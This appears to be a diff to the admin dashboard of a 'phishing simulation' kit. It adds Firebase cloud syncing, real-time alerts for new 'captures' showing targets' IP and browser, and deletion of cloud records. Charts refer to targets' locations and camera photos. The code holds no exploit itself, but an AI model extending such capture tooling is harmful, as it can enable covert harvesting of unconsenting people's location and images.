@@ -295,10 +295,12 @@
         <div class="controls">
             <h3>📊 Data Management</h3>
             <button class="btn" onclick="refreshData()">🔄 Refresh Data</button>
+            <button class="btn" onclick="loadCloudData()" style="background: #17a2b8;">☁️ Reload Cloud Data</button>
             <button class="btn" onclick="exportToCSV()">📥 Export CSV</button>
             <button class="btn" onclick="exportToJSON()">📥 Export JSON</button>
             <button class="btn" onclick="downloadAllPhotos()" style="background: #17a2b8;">📸 Download All Photos</button>
-            <button class="btn danger" onclick="clearAllData()">🗑️ Clear All Data</button>
+            <button class="btn danger" onclick="clearAllData()">🗑️ Clear Local Data</button>
+            <button class="btn danger" onclick="clearCloudData()">☁️🗑️ Clear Cloud Data</button>
         </div>
         
         <!-- Charts -->
@@ -361,11 +363,203 @@
         <img class="modal-content" id="modalImage">
     </div>
     
+    <!-- Firebase Integration untuk Admin -->
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
+    
     <script>
-        // Load and display data
+        // Firebase Configuration - HARUS SAMA dengan yang di index.html!
+        const firebaseConfig = {
+            apiKey: "demo-api-key-ganti-dengan-milik-anda",
+            authDomain: "demo-project.firebaseapp.com", 
+            databaseURL: "https://demo-project-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "demo-project",
+            storageBucket: "demo-project.appspot.com",
+            messagingSenderId: "123456789",
+            appId: "1:123456789:web:abcdef123456"
+        };
+        
+        // Initialize Firebase
+        let database = null;
+        let firebaseEnabled = false;
+        let cloudData = [];
+        
+        try {
+            if (firebaseConfig.apiKey !== "demo-api-key-ganti-dengan-milik-anda") {
+                firebase.initializeApp(firebaseConfig);
+                database = firebase.database();
+                firebaseEnabled = true;
+                console.log("🔥 Firebase connected successfully");
+                loadCloudData(); // Load data from Firebase
+                setupRealTimeListeners(); // Setup real-time updates
+            } else {
+                console.log("⚠️ Firebase not configured - using localStorage only");
+            }
+        } catch (error) {
+            console.log("⚠️ Firebase initialization failed - using localStorage only:", error.message);
+        }
+        
+        // Load data dari Firebase
+        async function loadCloudData() {
+            if (!firebaseEnabled || !database) return;
+            
+            try {
+                const snapshot = await database.ref('phishing_captures').once('value');
+                const firebaseData = snapshot.val();
+                
+                if (firebaseData) {
+                    cloudData = Object.values(firebaseData);
+                    console.log(`☁️ Loaded ${cloudData.length} records from Firebase`);
+                    
+                    // Update UI dengan data terbaru
+                    updateStats();
+                    updateTable();
+                    updateBrowserChart();
+                    updateTimeChart();
+                    updateLocationChart();
+                    updateCameraChart();
+                    
+                    // Show cloud data indicator
+                    showCloudDataStatus(cloudData.length);
+                } else {
+                    console.log("☁️ No data found in Firebase");
+                }
+            } catch (error) {
+                console.log("❌ Failed to load cloud data:", error.message);
+            }
+        }
+        
+        // Setup real-time listeners untuk auto-update
+        function setupRealTimeListeners() {
+            if (!firebaseEnabled || !database) return;
+            
+            // Listen untuk data baru
+            database.ref('phishing_captures').on('child_added', (snapshot) => {
+                const newData = snapshot.val();
+                if (newData && !cloudData.find(item => item.captureId === newData.captureId)) {
+                    cloudData.push(newData);
+                    console.log(`🆕 New capture detected: ${newData.captureId}`);
+                    
+                    // Auto-refresh dashboard
+                    updateStats();
+                    updateTable();
+                    updateBrowserChart();
+                    updateTimeChart();
+                    updateLocationChart();
+                    updateCameraChart();
+                    
+                    // Show notification
+                    showNewCaptureNotification(newData);
+                }
+            });
+            
+            // Listen untuk admin notifications  
+            database.ref('admin_notifications').limitToLast(1).on('child_added', (snapshot) => {
+                const notification = snapshot.val();
+                if (notification && notification.type === 'new_capture') {
+                    showRealtimeNotification(notification);
+                }
+            });
+        }
+        
+        // Show cloud data status
+        function showCloudDataStatus(count) {
+            // Add status indicator di header
+            const header = document.querySelector('.header');
+            let statusEl = document.getElementById('cloudStatus');
+            
+            if (!statusEl) {
+                statusEl = document.createElement('div');
+                statusEl.id = 'cloudStatus';
+                statusEl.style.cssText = 'background: rgba(255,255,255,0.2); padding: 8px; border-radius: 5px; margin-top: 10px; font-size: 14px;';
+                header.appendChild(statusEl);
+            }
+            
+            if (firebaseEnabled) {
+                statusEl.innerHTML = `☁️ Cloud Mode: ${count} records dari semua users | 📱 Local: ${JSON.parse(localStorage.getItem('phishingTestResults') || '[]').length} records`;
+            } else {
+                statusEl.innerHTML = `📱 Local Mode Only: ${JSON.parse(localStorage.getItem('phishingTestResults') || '[]').length} records`;
+            }
+        }
+        
+        // Show notification untuk capture baru
+        function showNewCaptureNotification(data) {
+            // Create notification popup
+            const notification = document.createElement('div');
+            notification.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                background: #28a745;
+                color: white;
+                padding: 15px;
+                border-radius: 8px;
+                box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+                z-index: 1000;
+                max-width: 300px;
+                animation: slideIn 0.3s ease;
+            `;
+            
+            notification.innerHTML = `
+                <strong>🆕 New Capture!</strong><br>
+                IP: ${data.technicalInfo?.ip || 'Unknown'}<br>
+                Browser: ${getBrowserName(data.technicalInfo?.browser?.userAgent || '')}<br>
+                <small>${new Date().toLocaleTimeString()}</small>
+            `;
+            
+            document.body.appendChild(notification);
+            
+            // Auto remove after 5 seconds
+            setTimeout(() => {
+                notification.remove();
+            }, 5000);
+        }
+        
+        // Show real-time notification
+        function showRealtimeNotification(notification) {
+            console.log('🔔 Real-time notification:', notification);
+            
+            // Update title untuk notifikasi
+            const originalTitle = document.title;
+            document.title = '🔴 New Capture - Admin Dashboard';
+            
+            setTimeout(() => {
+                document.title = originalTitle;
+            }, 3000);
+        }
+        
+        // Load and display data dari Firebase + localStorage
         function loadData() {
-            const data = JSON.parse(localStorage.getItem('phishingTestResults') || '[]');
-            return data;
+            const localData = JSON.parse(localStorage.getItem('phishingTestResults') || '[]');
+            
+            if (firebaseEnabled && cloudData.length > 0) {
+                // Combine cloud data + local data, remove duplicates berdasarkan captureId atau timestamp
+                const combinedData = [...cloudData];
+                
+                localData.forEach(localItem => {
+                    // Check jika local item belum ada di cloud data
+                    const exists = cloudData.find(cloudItem => {
+                        if (cloudItem.captureId && localItem.sessionInfo) {
+                            return cloudItem.captureId === localItem.sessionInfo.testId;
+                        }
+                        // Fallback comparison dengan timestamp jika captureId tidak ada
+                        const cloudTime = cloudItem.sessionInfo?.timestamp || cloudItem.testInfo?.timestamp;
+                        const localTime = localItem.sessionInfo?.timestamp || localItem.testInfo?.timestamp;
+                        return cloudTime === localTime;
+                    });
+                    
+                    if (!exists) {
+                        combinedData.push(localItem);
+                    }
+                });
+                
+                console.log(`📊 Combined data: ${cloudData.length} from cloud + ${localData.length} local = ${combinedData.length} total`);
+                return combinedData;
+            } else {
+                // Firebase tidak tersedia, gunakan localStorage saja
+                console.log(`📱 Local data only: ${localData.length} records`);
+                return localData;
+            }
         }
         
         // Update statistics
@@ -849,10 +1043,36 @@
         }
         
         function clearAllData() {
-            if (confirm('Are you sure you want to delete all phishing simulation data? This action cannot be undone.')) {
+            if (confirm('Are you sure you want to delete LOCAL phishing simulation data? This action cannot be undone.')) {
                 localStorage.removeItem('phishingTestResults');
                 refreshData();
-                alert('All data has been cleared.');
+                showCloudDataStatus(cloudData.length);
+                alert('Local data has been cleared.');
+            }
+        }
+        
+        // Clear cloud data dari Firebase
+        async function clearCloudData() {
+            if (!firebaseEnabled || !database) {
+                alert('Firebase tidak tersedia atau tidak dikonfigurasi.');
+                return;
+            }
+            
+            if (confirm('Are you sure you want to delete ALL CLOUD data from Firebase? This will affect all admins and cannot be undone!')) {
+                try {
+                    await database.ref('phishing_captures').remove();
+                    await database.ref('admin_notifications').remove();
+                    
+                    cloudData = [];
+                    refreshData();
+                    showCloudDataStatus(0);
+                    
+                    alert('☁️ All cloud data has been cleared from Firebase.');
+                    console.log('☁️ Cloud data cleared successfully');
+                } catch (error) {
+                    alert('Failed to clear cloud data: ' + error.message);
+                    console.error('❌ Failed to clear cloud data:', error);
+                }
             }
         }
         
